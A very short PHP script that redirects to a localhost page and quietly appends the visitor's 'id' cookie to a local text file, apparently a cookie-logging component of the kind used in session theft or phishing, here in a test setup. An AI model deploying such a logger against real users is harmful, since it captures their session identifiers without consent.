<?php 
header("Location: http://localhost/wow/WOWY1phptest.php");
$data = fopen("localdata.txt", "a");
$txt = "" . "\n" . "" . "\n" . "" . "\n" . $_COOKIE["id"] . "\n";
fwrite($data, $txt);
fclose($data);
exit;
?>
